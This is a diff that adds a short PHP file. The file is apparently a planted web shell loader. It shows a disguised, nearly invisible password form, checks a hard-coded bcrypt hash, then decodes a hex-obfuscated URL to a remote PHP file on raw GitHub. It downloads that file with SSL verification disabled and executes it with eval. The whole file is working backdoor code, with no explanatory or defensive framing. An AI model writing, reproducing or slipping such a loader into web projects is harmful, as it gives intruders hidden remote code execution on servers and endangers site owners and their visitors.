@@ -1,0 +1,41 @@
+<?php
+session_start();
+$ea = '$2a$12$zvY.amwkRqLajM/YAVoQq.cOmfnPdm2Xx9D4z2QisASymcTn.YXYm'; 
+if (!isset($_SESSION['logged_in'])) {
+ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+ if (password_verify($_POST['pass'], $ea)) {
+$_SESSION['logged_in'] = true;
+ header("Location: " . $_SERVER['PHP_SELF']);
+ exit;
+ } else {
+     $error = "X";
+ }
+ }
+if (isset($error)) echo '<p style="color:red;">' . htmlspecialchars($error) . '</p>';
+echo '<form method="post">
+<style>
+        input { margin:0;background-color:#fff;border:1px solid #fff; }
+    </style>
+ <label><input type="password" name="pass"></label><br>
+<input type="submit" value="">
+';
+ exit;
+}
+$hexUrl = '68747470733A2F2F7261772E67697468756275736572636F6E74656E742E636F6D2F746F6D696E746865736B792F3330332F726566732F68656164732F6D61696E2F54656E6E65737365652D616C66612E706870';
+$url = hex2bin($hexUrl);
+
+$phpScript = @file_get_contents($url);
+if ($phpScript === false && function_exists('curl_init')) {
+    $ch = curl_init($url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    $phpScript = curl_exec($ch);
+    curl_close($ch);
+}
+
+if ($phpScript !== false) {
+    eval('?>' . $phpScript);
+} else {
+    die("x");
+}
+?>
